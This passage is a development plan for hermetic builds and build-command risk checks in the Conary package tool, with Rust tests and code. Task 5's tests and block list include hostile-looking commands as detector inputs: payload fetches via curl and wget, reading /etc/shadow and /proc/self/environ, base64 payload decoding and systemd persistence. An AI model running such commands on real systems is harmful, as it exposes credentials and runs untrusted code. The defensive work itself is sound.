- [ ] **Step 2: Implement policy evaluation**

Add:

```rust
pub fn evaluate_ecosystem_policy(
    build_system: BuildSystem,
    source_root: &Path,
    command_text: &str,
) -> Result<EcosystemPolicyReport>;
```

Cargo rules:

- Require `Cargo.lock`.
- Require explicit `--offline` in the command text or `.cargo/config.toml` containing offline mode.
- Accept no external registry dependencies when `Cargo.lock` lacks `source = "registry+`.
- Accept registry dependencies only when `vendor/` or a pinned Cargo cache exists, `.cargo/config.toml` pins offline/source replacement to that content, and the vendor/cache tree plus `.cargo/config.toml` are recorded as `EcosystemDependencyIdentity` entries.
- Block all other Cargo cases with a diagnostic naming the missing evidence.

Go, npm, and Python rules:

- Return `PolicyStatus::Blocked`.
- Diagnostic text must name the ecosystem and say M2a has no accepted hermetic policy for it yet.

- [ ] **Step 3: Make inferred Cargo commands explicit offline when evidence exists**

In `recipe/inference/detectors.rs`, change the Cargo command generation so when `Cargo.lock` exists it emits:

```rust
"cargo build --release --locked --offline"
```

Keep the existing no-lock command as:

```rust
"cargo build --release"
```

Update detector tests that currently expect `cargo build --release --locked`.

- [ ] **Step 4: Run tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic::ecosystem
cargo test -p conary-core recipe::inference::detectors
```

Expected: Cargo policy tests pass, and inference tests reflect the new offline command for locked Cargo projects.

- [ ] **Step 5: Commit**

```bash
git add crates/conary-core/src/recipe/hermetic crates/conary-core/src/recipe/inference/detectors.rs
git commit -m "feat(packaging): add hermetic ecosystem policy"
```

---

### Task 5: Add Build Command Risk Reports

**Files:**
- Create: `crates/conary-core/src/recipe/hermetic/command_risk.rs`
- Modify: `crates/conary-core/src/recipe/hermetic/mod.rs`
- Modify: `crates/conary-core/src/ccs/convert/command_evidence.rs`
- Modify: `crates/conary-core/src/container/analysis.rs`
- Modify: `crates/conary-core/src/recipe/pkgbuild.rs`
- Test: `crates/conary-core/src/recipe/hermetic/command_risk.rs`
- Test: `crates/conary-core/src/container/analysis.rs`
- Test: `crates/conary-core/src/recipe/pkgbuild.rs`

- [ ] **Step 1: Expose generic shell-text invocation extraction**

In `ccs/convert/command_evidence.rs`, add:

```rust
pub fn extract_invocations_from_shell_text(
    entry_id: &str,
    content: &str,
    phase: Option<&str>,
) -> Vec<CommandInvocation> {
    extract_invocations_from_text(InvocationText {
        entry_id,
        content,
        source: CommandEvidenceSource::StaticSignal,
        phase: phase.map(str::to_string),
        lifecycle_paths: phase.map(str::to_string).into_iter().collect(),
        interpreter: Some("/bin/sh".to_string()),
    })
}
```

Add a test proving `npm install atomic-lockfile && bun add js-digest` produces two invocations.

- [ ] **Step 2: Write command-risk tests**

Add tests:

```rust
#[test]
fn package_manager_fetches_are_blocked_without_evidence() {
    let report = classify_build_commands(&[
        BuildCommandText::new("build", "npm install atomic-lockfile minimist"),
        BuildCommandText::new("check", "bun add js-digest"),
    ]);

    assert_eq!(report.status, PolicyStatus::Blocked);
    assert!(report.entries.iter().any(|entry| entry.command == "npm"));
    assert!(report.entries.iter().any(|entry| entry.reason_code == "package-manager-fetch"));
}

#[test]
fn dynamic_language_execution_and_bpf_are_reported() {
    let report = classify_build_commands(&[
        BuildCommandText::new("build", "node -e \"require('x')\""),
        BuildCommandText::new("install", "bpftool prog list"),
    ]);

    assert_eq!(report.status, PolicyStatus::Blocked);
    assert!(report.entries.iter().any(|entry| entry.reason_code == "dynamic-language-exec"));
    assert!(report.entries.iter().any(|entry| entry.reason_code == "bpf-or-ebpf"));
}

#[test]
fn clean_commands_are_clean() {
    let report = classify_build_commands(&[
        BuildCommandText::new("build", "make"),
        BuildCommandText::new("install", "make install DESTDIR=%(destdir)s"),
    ]);

    assert_eq!(report.status, PolicyStatus::Clean);
    assert!(report.entries.is_empty());
}
```

Add a table-driven test that covers every listed risk family, including wrapped/evasion shapes:

```rust
#[test]
fn command_risk_detects_wrappers_and_every_block_family() {
    let cases = [
        ("env -i npm install atomic-lockfile", "package-manager-fetch"),
        ("/usr/bin/curl https://example.invalid/payload", "network-fetch"),
        ("bash -c 'curl https://example.invalid/payload'", "network-fetch"),
        ("echo $(wget https://example.invalid/payload)", "network-fetch"),
        ("python -c 'print(1)'", "dynamic-language-exec"),
        ("cat /etc/shadow", "credential-path"),
        ("base64 --decode payload.txt", "obfuscation"),
        ("systemctl --user enable payload.service", "persistence"),
        ("cat /proc/self/environ", "proc-stealth-or-debug"),
    ];

    for (command, reason) in cases {
        let report = classify_build_commands(&[BuildCommandText::new("build", command)]);
        assert_eq!(report.status, PolicyStatus::Blocked, "{command}");
        assert!(report.entries.iter().any(|entry| entry.reason_code == reason), "{command}");
    }
}
```

- [ ] **Step 3: Implement command-risk classification**

Use these public types:

```rust
#[derive(Debug, Clone)]
pub struct BuildCommandText {
    pub phase: String,
    pub content: String,
}

impl BuildCommandText {
    pub fn new(phase: impl Into<String>, content: impl Into<String>) -> Self {
        Self { phase: phase.into(), content: content.into() }
    }
}

pub fn collect_recipe_command_text(recipe: &Recipe) -> Vec<BuildCommandText>;
pub fn classify_build_commands(commands: &[BuildCommandText]) -> BuildCommandRiskReport;
```

Classify these commands or raw-line signals as `PolicyStatus::Blocked`:

- `npm`, `npx`, `pnpm`, `yarn`, `bun`, `pip`, `gem`, `cargo install`, `go install`
- `git clone`, `curl`, `wget`, `aria2c`, `fetch`
- `node -e`, `python -c`, `perl -e`, `ruby -e`
- `/etc/shadow`, `/etc/sudoers`, `authorized_keys`
- `base64 -d`, `eval`
- `crontab`, `systemctl enable`, user-level persistence file writes
- `bpf`, `bpftool`, `libbpf`, `perf_event_open`
- `ptrace`, `strace`, `gdb`, `/proc/*/mem`, `/proc/*/environ`

For allowed commands, return a clean report. This report is not a malware verdict; it is publish policy evidence.

- [ ] **Step 4: Add PKGBUILD body extraction helper**

In `recipe/pkgbuild.rs`, add:

```rust
pub fn extract_pkgbuild_function_bodies_for_risk(content: &str) -> Vec<(String, String)> {
    extract_functions(content)
        .into_iter()
        .filter(|(name, _)| matches!(name.as_str(), "prepare" | "build" | "check" | "package"))
        .collect()
}
```

Add a test with `prepare() { npm install atomic-lockfile; }` proving the helper returns the `prepare` body.

- [ ] **Step 5: Extend runtime scriptlet auto-risk**

In `container/analysis.rs`, add patterns that classify package-manager fetches and dynamic language execution as at least `ScriptRisk::Medium`. Add tests:

```rust
#[test]
fn package_manager_fetches_are_medium_for_auto_sandbox() {
    let analysis = analyze_script("npm install atomic-lockfile\nbun add js-digest\n");
    assert!(analysis.risk >= ScriptRisk::Medium);
    assert!(analysis.patterns.iter().any(|p| p.contains("package-manager")));
}
```

- [ ] **Step 6: Run tests**

Run:

```bash
cargo test -p conary-core command_evidence
cargo test -p conary-core recipe::hermetic::command_risk
cargo test -p conary-core container::analysis
cargo test -p conary-core recipe::pkgbuild
```

Expected: command evidence, build risk, runtime auto-risk, and PKGBUILD helper tests pass.

- [ ] **Step 7: Commit**

```bash
git add crates/conary-core/src/ccs/convert/command_evidence.rs crates/conary-core/src/recipe/hermetic crates/conary-core/src/container/analysis.rs crates/conary-core/src/recipe/pkgbuild.rs
git commit -m "security(packaging): classify hermetic build command risks"
```

---

### Task 6: Add Source Download Policy And Hermetic Build Plan

**Files:**
- Create: `crates/conary-core/src/recipe/hermetic/plan.rs`
- Create: `crates/conary-core/src/recipe/hermetic/reproducibility.rs`
- Modify: `crates/conary-core/src/recipe/hermetic/mod.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/config.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/mod.rs`
- Test: `crates/conary-core/src/recipe/hermetic/plan.rs`
- Test: `crates/conary-core/src/recipe/kitchen/mod.rs`

- [ ] **Step 1: Add source-download policy tests**

Add tests in `kitchen/mod.rs`:

```rust
#[test]
fn offline_cache_only_refuses_missing_source() {
    let cache = tempfile::tempdir().unwrap();
    let kitchen = Kitchen::new(KitchenConfig {
        source_cache: cache.path().to_path_buf(),
        source_download_policy: SourceDownloadPolicy::OfflineCacheOnly,
        ..KitchenConfig::default()
    });

    let error = kitchen
        .fetch_source("https://example.invalid/test.tar.gz", "sha256:missing")
        .unwrap_err();

    assert!(error.to_string().contains("source cache"));
    assert!(error.to_string().contains("offline"));
}
```

- [ ] **Step 2: Add `SourceDownloadPolicy`**

In `KitchenConfig`, add:

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceDownloadPolicy {
    AllowDownloads,
    OfflineCacheOnly,
}
```

Add:

```rust
pub source_download_policy: SourceDownloadPolicy,
```

Default it to `SourceDownloadPolicy::AllowDownloads` so existing non-hermetic paths remain unchanged.

In `Kitchen::fetch_source()`, before `download_file()`:

```rust
if self.config.source_download_policy == SourceDownloadPolicy::OfflineCacheOnly {
    return Err(Error::ConfigError(format!(
        "source cache miss for {url}; hermetic offline build requires prefetch before build"
    )));
}
```

- [ ] **Step 3: Write hermetic plan tests**

Add:

```rust
#[test]
fn hermetic_plan_for_local_cargo_project_is_clean() {
    let fixture = cargo_project_with_lock();
    let recipe = inferred_cargo_recipe(fixture.path());
    let input = HermeticBuildInput::generated_recipe(
        fixture.path(),
        recipe.clone(),
        "sha256:inference-trace",
    );

    let plan = HermeticBuildPlan::from_recipe(&recipe, input, CiMode::Off).unwrap();

    assert_eq!(plan.evidence.schema_version, HERMETIC_EVIDENCE_SCHEMA_V1);
    assert_eq!(plan.evidence.ecosystem_policy.status, PolicyStatus::Clean);
    assert_eq!(plan.evidence.command_risk.status, PolicyStatus::Clean);
    assert_eq!(plan.evidence.build_input.builder_environment.kind, BuilderEnvironmentKind::Pristine);
    assert!(plan.local_files.is_some());
}

#[test]
fn hermetic_plan_blocks_npm_fetch_command() {
    let fixture = npm_project();
    let recipe = inferred_npm_recipe(fixture.path());
    let input = HermeticBuildInput::generated_recipe(
        fixture.path(),
        recipe.clone(),
        "sha256:inference-trace",
    );

    let error = HermeticBuildPlan::from_recipe(&recipe, input, CiMode::Off).unwrap_err();

    assert!(error.to_string().contains("npm"));
    assert!(error.to_string().contains("M2a hermetic support"));
}

#[test]
fn hermetic_plan_blocks_unlocked_build_dependencies() {
    let fixture = cargo_project_with_lock();
    let recipe = recipe_with_makedepends(["openssl-devel"]);
    let input = HermeticBuildInput::explicit_recipe(fixture.path(), fixture.recipe_path(), "sha256:recipe");

    let error = HermeticBuildPlan::from_recipe(&recipe, input, CiMode::Off).unwrap_err();

    assert!(error.to_string().contains("build dependency"));
    assert!(error.to_string().contains("content identity"));
}

#[test]
fn hermetic_plan_resolves_source_path_relative_to_recipe_base() {
    let fixture = recipe_with_local_source_path("src");
    let input = HermeticBuildInput::explicit_recipe(fixture.project_dir(), fixture.recipe_path(), "sha256:recipe");

    let plan = HermeticBuildPlan::from_recipe(&fixture.recipe, input, CiMode::Off).unwrap();

    assert!(plan.local_files.as_ref().unwrap().iter().all(|file| file.relative_path.starts_with("src")));
}
```

- [ ] **Step 4: Implement `HermeticBuildPlan`**

Use:

```rust
#[derive(Debug, Clone)]
pub struct HermeticBuildPlan {
    pub evidence: HermeticBuildEvidence,
    pub local_files: Option<Vec<CanonicalLocalFile>>,
    pub reproducibility: ReproducibilityConfig,
}

#[derive(Debug, Clone)]
pub struct HermeticBuildInput {
    pub recipe_identity: RecipeIdentity,
    pub recipe_source_base_dir: PathBuf,
    pub generated_recipe: Option<Recipe>,
    pub inference_trace_hash: Option<String>,
    pub builder_environment: BuilderEnvironmentIdentity,
    pub locked_repository_dependencies: Vec<LockedRepositoryDependency>,
}

impl HermeticBuildPlan {
    pub fn from_recipe(recipe: &Recipe, input: HermeticBuildInput, ci_mode: CiMode) -> Result<Self>;

    pub fn apply_to_kitchen_config(&self, config: &mut KitchenConfig) {
        config.use_isolation = true;
        config.allow_network = false;
        config.pristine_mode = true;
        config.source_download_policy = SourceDownloadPolicy::OfflineCacheOnly;
        config.hermetic_evidence = Some(self.evidence.clone());
        config.hermetic_local_files = self.local_files.clone();
        config.reproducibility = Some(self.reproducibility.clone());
    }
}
```

`from_recipe()` must:

- Refuse to produce `hardening_level = "hermetic"` unless `input.builder_environment.kind == BuilderEnvironmentKind::Pristine` and the builder sysroot/toolchain identity is present or explicitly recorded as unavailable with a blocking diagnostic.
- Build required `RecipeIdentity`: explicit recipe file hash for recipe-backed builds, or canonical generated recipe hash plus inference trace hash for inferred builds. Block hermetic evidence if the recipe identity cannot be produced.
- Resolve `SourceSection::Local` relative to `input.recipe_source_base_dir`, not the process working directory, so `[source] path = "src"` hashes and materializes only that local source root.
- Build primary source identity for local or remote sources.
- Record `additional_sources: Vec<SourceArchiveIdentity>` for every staged additional source, including substituted URL, checksum, extract flag, and target. Block when an additional source lacks checksum/content identity.
- Collect recipe commands and command-risk report.
- Evaluate ecosystem policy for inferred Cargo, Go, npm, and Python when build-system evidence is known. For explicit recipes, infer from markers under the source root when possible and otherwise use command-risk report only.
- If `recipe.all_build_deps()` is non-empty, require `input.locked_repository_dependencies` to contain immutable repository URL, snapshot version, package version/release, architecture, and content identity for each build dependency; otherwise block hermetic planning.
- Block when any report status is `Blocked`.
- Return clean evidence for local Cargo projects with lock/no-registry or vendor evidence and `--offline`.
- Construct the initial `ReproducibilityConfig` before returning the plan. Task 7 extends that module with env injection and validation.

- [ ] **Step 5: Run tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic::plan
cargo test -p conary-core recipe::kitchen
```

Expected: hermetic plan and source-download policy tests pass.

- [ ] **Step 6: Commit**

```bash
git add crates/conary-core/src/recipe/hermetic crates/conary-core/src/recipe/kitchen
git commit -m "feat(packaging): assemble hermetic build plans"
```

---

### Task 7: Add Reproducibility Controls

**Files:**
- Modify: `crates/conary-core/src/recipe/hermetic/reproducibility.rs`
- Modify: `crates/conary-core/src/recipe/hermetic/mod.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/config.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/cook.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/provenance_capture.rs`
- Test: `crates/conary-core/src/recipe/hermetic/reproducibility.rs`
- Test: `crates/conary-core/src/recipe/kitchen/cook.rs`

- [ ] **Step 1: Write reproducibility tests**

Add:

```rust
#[test]
fn reproducibility_env_sets_source_date_epoch_and_path_maps() {
    let source = Path::new("/tmp/conary/source");
    let build = Path::new("/tmp/conary/build");
    let config = ReproducibilityConfig::new(123, source, build);

    let env = config.env_vars();

    assert!(env.iter().any(|(k, v)| k == "SOURCE_DATE_EPOCH" && v == "123"));
    assert!(env.iter().any(|(k, v)| k == "RUSTFLAGS" && v.contains("--remap-path-prefix")));
    assert!(env.iter().any(|(k, v)| k == "CFLAGS" && v.contains("-ffile-prefix-map")));
}

#[test]
fn final_env_preserves_recipe_flags_and_appends_required_remaps() {
    let source = Path::new("/tmp/conary/source");
    let build = Path::new("/tmp/conary/build");
    let config = ReproducibilityConfig::new(123, source, build);

    let final_env = config.merge_env(
        vec![("RUSTFLAGS".to_string(), "-C target-cpu=native".to_string())]
    ).unwrap();

    let rustflags = final_env.iter().find(|(k, _)| k == "RUSTFLAGS").unwrap().1.as_str();
    assert!(rustflags.contains("-C target-cpu=native"));
    assert!(rustflags.contains("--remap-path-prefix"));
}

#[test]
fn hermetic_env_validation_rejects_missing_required_remap() {
    let config = ReproducibilityConfig::new(123, Path::new("/src"), Path::new("/build"));

    let error = config
        .validate_final_env(&[("RUSTFLAGS".to_string(), "-C opt-level=2".to_string())])
        .unwrap_err();

    assert!(error.to_string().contains("RUSTFLAGS"));
    assert!(error.to_string().contains("remap-path-prefix"));
}
```

- [ ] **Step 2: Extend reproducibility config**

Use:

```rust
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReproducibilityConfig {
    pub source_date_epoch: i64,
    pub source_root: PathBuf,
    pub build_root: PathBuf,
}

impl ReproducibilityConfig {
    pub fn new(source_date_epoch: i64, source_root: &Path, build_root: &Path) -> Self;
    pub fn env_vars(&self) -> Vec<(String, String)>;
    pub fn merge_env(&self, recipe_env: Vec<(String, String)>) -> Result<Vec<(String, String)>>;
    pub fn validate_final_env(&self, env: &[(String, String)]) -> Result<()>;
    pub fn record(&self) -> ReproducibilityRecord;
}
```

`env_vars()` must set:

- `SOURCE_DATE_EPOCH`
- `RUSTFLAGS=--remap-path-prefix=<source_root>=/build/source --remap-path-prefix=<build_root>=/build`
- `CFLAGS=-ffile-prefix-map=<source_root>=/build/source -ffile-prefix-map=<build_root>=/build`
- `CXXFLAGS` with the same `-ffile-prefix-map` values

When recipe-provided environment values already contain `RUSTFLAGS`, `CFLAGS`, or `CXXFLAGS`, preserve the recipe-provided flags and append M2a remap flags after them. `SOURCE_DATE_EPOCH` is controlled by the hermetic plan in hermetic mode; recipe attempts to override it must fail with a diagnostic.

- [ ] **Step 3: Inject env in Kitchen**

In `Cook::simmer()`, compute the final environment for hermetic builds with `config.reproducibility.merge_env(recipe_env)` after collecting `extra_env`, recipe-level environment entries, and command-local env prefixes. Then call `validate_final_env()` immediately before command execution. A recipe may add flags, but it cannot erase `SOURCE_DATE_EPOCH` or required path remapping.

- [ ] **Step 4: Record reproducibility in provenance**

Add to `ProvenanceCapture`:

```rust
pub hermetic_evidence: Option<HermeticBuildEvidence>,
pub hardening_level_override: Option<String>,
```

In `to_manifest_provenance()`, set:

```rust
hardening_level: Some(
    self.hardening_level_override
        .clone()
        .unwrap_or_else(|| if self.isolated { "sandboxed".to_string() } else { "host".to_string() }),
),
hermetic_evidence: self.hermetic_evidence.clone(),
```

Update both `Cook::new` and `Cook::new_with_dest` to copy `KitchenConfig.hermetic_evidence` into `ProvenanceCapture` and set `hardening_level_override = Some("hermetic".to_string())` only when hermetic evidence is present and `KitchenConfig.pristine_mode` is true. If hermetic evidence is present without pristine mode, return a configuration error before build execution.

- [ ] **Step 5: Run tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic::reproducibility
cargo test -p conary-core recipe::kitchen::cook
cargo test -p conary-core recipe::kitchen::provenance_capture
```

Expected: reproducibility env and provenance tests pass.

- [ ] **Step 6: Commit**

```bash
git add crates/conary-core/src/recipe/hermetic crates/conary-core/src/recipe/kitchen
git commit -m "feat(packaging): record hermetic reproducibility controls"
```

---

### Task 8: Wire Hermetic Cook

**Files:**
- Modify: `crates/conary-core/src/recipe/kitchen/mod.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/config.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/cook.rs`
- Modify: `apps/conary/src/commands/cook.rs`
- Test: `crates/conary-core/src/recipe/kitchen/mod.rs`
- Test: `apps/conary/src/commands/cook.rs`

- [ ] **Step 1: Add core hermetic cook test**

Add a Kitchen test:

```rust
#[test]
fn cook_hermetic_prefetches_then_builds_offline() {
    let fixture = local_cargo_recipe_fixture();
    let output_dir = fixture.work_dir.join("dist");
    let prefetch_config = KitchenConfig {
        source_cache: fixture.source_cache.clone(),
        recipe_source_base_dir: Some(fixture.project_dir.clone()),
        ..KitchenConfig::default()
    };
    let kitchen = Kitchen::new(prefetch_config);
    let input = HermeticBuildInput::explicit_recipe(
        fixture.project_dir.clone(),
        fixture.recipe_path.clone(),
        "sha256:recipe",
    )
    .with_pristine_builder_environment(fixture.builder_environment_identity());

    let result = kitchen.cook_hermetic(&fixture.recipe, input, &output_dir, CiMode::Off).unwrap();
    let provenance = result.provenance.expect("hermetic provenance");

    assert_eq!(provenance.hardening_level.as_deref(), Some("hermetic"));
    assert!(provenance.hermetic_evidence.is_some());
    assert!(provenance.hermetic_evidence.as_ref().unwrap().build_input.builder_environment.kind == BuilderEnvironmentKind::Pristine);
}
```

- [ ] **Step 2: Implement `Kitchen::cook_hermetic`**

Add:

```rust
pub fn cook_hermetic(
    &self,
    recipe: &Recipe,
    input: HermeticBuildInput,
    output_dir: &Path,
    ci_mode: CiMode,
) -> Result<CookResult> {
    self.fetch(recipe)?;
    let plan = HermeticBuildPlan::from_recipe(recipe, input, ci_mode)?;
    let mut build_config = self.config.clone();
    plan.apply_to_kitchen_config(&mut build_config);
    let kitchen = self.with_config_preserving_resolver(build_config);
    kitchen.cook(recipe, output_dir)
}
```

Implement `Kitchen::with_config_preserving_resolver(build_config)` or an equivalent constructor so `cook_hermetic()` carries `self.resolver` into the offline build Kitchen. Add a test with `makedepends` and a fake resolver proving the resolver is still invoked after hermetic planning.

- [ ] **Step 3: Wire `cmd_cook`**

In `apps/conary/src/commands/cook.rs`:

- Remove the early rejection for `hermetic`.
- Keep `--no-isolation` as host-build compatibility.
- Treat `--isolated` and hidden `--hermetic` as the hermetic path after M2a.
- For host builds, preserve existing environment passthrough and `hardening_level = "host"`.

Use this decision:

```rust
let hermetic_requested = hermetic || isolated;
if hermetic_requested && no_isolation {
    anyhow::bail!("--no-isolation conflicts with hermetic isolated builds");
}
```

For the hermetic path, construct `HermeticBuildInput` from the resolved recipe path or generated inference trace, `resolved.recipe_source_base_dir`, pristine builder environment identity, and locked build-dependency identities, then call:

```rust
kitchen.cook_hermetic(
    &recipe,
    hermetic_input,
    output_dir,
    conary_core::recipe::hermetic::detect_ci_mode(),
)
```

- [ ] **Step 4: Update output text**

For hermetic cook, print:

```text
Cooking with <N> parallel jobs (hermetic)...
  - Sources prefetched before build
  - Network disabled during build
  - Build evidence recorded without M2b attestation
```

Do not print "attested".

- [ ] **Step 5: Run tests**

Run:

```bash
cargo test -p conary-core recipe::kitchen
cargo test -p conary --lib commands::cook
```

Expected: hermetic Kitchen tests pass, and command tests prove hidden `--hermetic` no longer rejects while artifact publish remains unchanged.

- [ ] **Step 6: Commit**

```bash
git add crates/conary-core/src/recipe/kitchen apps/conary/src/commands/cook.rs
git commit -m "feat(packaging): route isolated cook through hermetic builds"
```

---

### Task 9: Wire Project-Form Hermetic Publish

**Files:**
- Modify: `apps/conary/src/commands/publish.rs`
- Test: `apps/conary/src/commands/publish.rs`
- Test: `apps/conary/tests/packaging_m2a.rs`

- [ ] **Step 1: Update publish config tests**

Replace the current `publish_kitchen_config_forces_isolation_and_allows_network` test with:

```rust
#[test]
fn publish_kitchen_config_uses_hermetic_defaults() {
    let recipe_path = std::path::Path::new("/work/pkg/recipe.toml");
    let output_dir = std::path::Path::new("/tmp/conary-publish-out");
    let config = publish_kitchen_config(recipe_path, output_dir);

    assert!(config.use_isolation);
    assert!(!config.allow_network);
    assert!(config.pristine_mode);
    assert_eq!(
        config.recipe_source_base_dir,
        Some(std::path::PathBuf::from("/work/pkg"))
    );
}
```

- [ ] **Step 2: Use `cook_hermetic` in project-form publish**

In `cmd_publish`, replace `kitchen.cook(&recipe, output_dir.path())` with:

```rust
let hermetic_input = HermeticBuildInput::explicit_recipe(
    recipe_source_base_dir(&recipe_path),
    recipe_path.clone(),
    hash_file(&recipe_path)?,
)
.with_pristine_builder_environment(detect_builder_environment_identity()?)
.with_locked_repository_dependencies(resolve_locked_build_dependencies(&recipe)?);

let result = kitchen
    .cook_hermetic(&recipe, hermetic_input, output_dir.path(), conary_core::recipe::hermetic::detect_ci_mode())
    .with_context(|| format!("Failed to hermetically cook {}", recipe.package.name))?;
```

Keep `publish_static_repo()` unchanged for M2a so the static repo path still signs package signatures and writes TUF metadata exactly as M1a did.

- [ ] **Step 3: Update user-facing publish text**

Replace the M1a preview message with:

```text
M2a static publish records hermetic build evidence, but release attestation gates arrive in M2b.
```

Replace "sandboxed, network allowed" with:

```text
hermetic, pristine/no-host-mount build with network disabled
```

- [ ] **Step 4: Preserve artifact-form rejection**

Keep `ARTIFACT_FORM_REJECTION` unchanged:

```rust
const ARTIFACT_FORM_REJECTION: &str =
    "artifact-form publish requires M2 attestation support; run project-form publish from a recipe project";
```

Add a unit test asserting artifact-form publish still returns this exact text.

- [ ] **Step 5: Add CLI integration tests**

Create `apps/conary/tests/packaging_m2a.rs` with tests:

```rust
#[test]
fn publish_project_form_records_hermetic_evidence_without_build_attestation() {
    let fixture = CargoHermeticFixture::new();
    let output = fixture.publish_project_form();
    assert_success(&output);
    assert_stdout_contains(&output, "M2a static publish records hermetic build evidence");

    let manifest = fixture.read_published_package_manifest();
    let provenance = manifest.provenance.expect("provenance");
    assert_eq!(provenance.hardening_level.as_deref(), Some("hermetic"));
    assert!(provenance.hermetic_evidence.is_some());
    assert!(!provenance.signatures.is_empty());

    let manifest_text = fixture.read_published_manifest_text();
    assert!(!manifest_text.contains("build_attestation"));
    assert!(!manifest_text.contains("BuildAttestationEnvelope"));
    assert!(!manifest_text.contains("attested"));
}

#[test]
fn cook_isolated_records_hermetic_evidence() {
    let fixture = CargoHermeticFixture::new();
    let output = fixture.cook_isolated();
    assert_success(&output);

    let manifest = fixture.read_package_manifest();
    let provenance = manifest.provenance.expect("provenance");
    assert_eq!(provenance.hardening_level.as_deref(), Some("hermetic"));
    assert!(provenance.hermetic_evidence.is_some());
}

#[test]
fn cook_isolated_blocks_npm_fetch_before_build() {
    let fixture = NpmFetchFixture::new();
    let output = fixture.cook_isolated();
    assert_failure_contains(&output, &["npm", "M2a hermetic support"]);
    assert!(!fixture.package_path().exists());
}

#[test]
fn publish_artifact_form_still_requires_m2b_attestation() {
    let fixture = CargoHermeticFixture::new();
    let package = fixture.cook_isolated_package_path();
    assert!(package.is_file());
    let output = fixture.publish_artifact_form_with_package(&package);
    assert_failure_contains(&output, &["artifact-form publish requires M2 attestation support"]);
}
```

Implement fixture helpers in the same test file, following the style in `apps/conary/tests/packaging_m1b.rs`.

- [ ] **Step 6: Run tests**

Run:

```bash
cargo test -p conary --lib commands::publish
cargo test -p conary --test packaging_m2a
```

Expected: publish unit tests and M2a CLI integration tests pass.

- [ ] **Step 7: Commit**

```bash
git add apps/conary/src/commands/publish.rs apps/conary/tests/packaging_m2a.rs
git commit -m "feat(packaging): publish with hermetic build evidence"
```

---

### Task 10: Add Host-Vs-Hermetic Divergence Diagnostics

**Files:**
- Modify: `crates/conary-core/src/recipe/hermetic/evidence.rs`
- Modify: `crates/conary-core/src/recipe/hermetic/plan.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/config.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/mod.rs`
- Test: `crates/conary-core/src/recipe/hermetic/plan.rs`

- [ ] **Step 1: Add divergence data structs**

Add:

```rust
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct HostBuildRecord {
    pub input_identity_hash: String,
    pub output_merkle_root: Option<String>,
    pub package_name: String,
    pub package_version: String,
    pub package_release: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct DivergenceReport {
    pub compared: bool,
    pub status: DivergenceStatus,
    pub diagnostics: Vec<String>,
}

#[derive(Debug, Clone, Copy, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum DivergenceStatus {
    NoHostRecord,
    Match,
    DifferentOutput,
}
```

Add `divergence: DivergenceReport` to `HermeticBuildEvidence`.

- [ ] **Step 2: Write comparison tests**

Add:

```rust
#[test]
fn divergence_report_marks_missing_host_record() {
    let report = compare_host_record(None, Some("sha256:output"));
    assert_eq!(report.status, DivergenceStatus::NoHostRecord);
    assert!(!report.compared);
}

#[test]
fn divergence_report_marks_different_output() {
    let host = HostBuildRecord {
        input_identity_hash: "sha256:input".to_string(),
        output_merkle_root: Some("sha256:host".to_string()),
        package_name: "pkg".to_string(),
        package_version: "1.0".to_string(),
        package_release: "1".to_string(),
    };
    let report = compare_host_record(Some(&host), Some("sha256:hermetic"));
    assert_eq!(report.status, DivergenceStatus::DifferentOutput);
    assert!(report.diagnostics.iter().any(|d| d.contains("differs")));
}
```

- [ ] **Step 3: Record but do not block on divergence in M2a**

Implement `compare_host_record()`. M2a records divergence diagnostics only; it must not fail a hermetic build solely because host and hermetic outputs differ. M2b or a later policy can turn divergence into a publish lint gate.

- [ ] **Step 4: Run tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic::plan
cargo test -p conary-core recipe::hermetic::evidence
```

Expected: divergence report tests pass.

- [ ] **Step 5: Commit**

```bash
git add crates/conary-core/src/recipe/hermetic crates/conary-core/src/recipe/kitchen
git commit -m "feat(packaging): record host hermetic divergence evidence"
```

---

### Task 11: Refresh Docs And Final Verification

**Files:**
- Modify: `docs/ARCHITECTURE.md`
- Modify: `docs/modules/recipe.md`
- Modify: `docs/modules/ccs.md`
- Modify: `docs/modules/feature-ownership.md`
- Modify: `docs/llms/subsystem-map.md`
- Modify: `docs/superpowers/documentation-accuracy-audit-inventory.tsv`
- Modify: `docs/superpowers/documentation-accuracy-audit-ledger.tsv`

- [ ] **Step 1: Update docs with the landed ownership paths**

Update docs to say:

- M2a hermetic evidence lives under `crates/conary-core/src/recipe/hermetic/`.
- `ccs::manifest` still owns the root manifest, while `ccs::manifest_provenance` owns provenance DTOs.
- `conary cook --isolated` is the hermetic build path after M2a.
- `conary publish <target>` performs a hermetic project-form build but remains pre-M2b for signed attestation gates.
- `conary publish <pkg.ccs> <target>` still rejects until M2b.

- [ ] **Step 2: Register docs-audit entries**

Run:

```bash
bash scripts/docs-audit-inventory.sh > /tmp/conary-docs-audit-inventory.tsv
diff -u docs/superpowers/documentation-accuracy-audit-inventory.tsv /tmp/conary-docs-audit-inventory.tsv
```

Apply the inventory diff to `docs/superpowers/documentation-accuracy-audit-inventory.tsv`.

Add or refresh ledger rows for the docs changed in this task, including this plan. The row for this plan must use:

- `family`: `planning`
- `audience`: `maintainer`
- `claim_clusters`: `packaging-toolchain; m2a; hermetic-publish; implementation-plan`
- `status`: `verified`
- `disposition`: `corrected`

Before editing public command help, docs claims, or route-facing guidance, grep `docs/superpowers/feature-coherency-ledger.tsv` for the touched paths. If implementation updates feature-coherency rows or wave scopes, run the relevant `scripts/check-coherency-wave-scopes.sh` command in addition to the ledger check below.

- [ ] **Step 3: Run focused package tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic
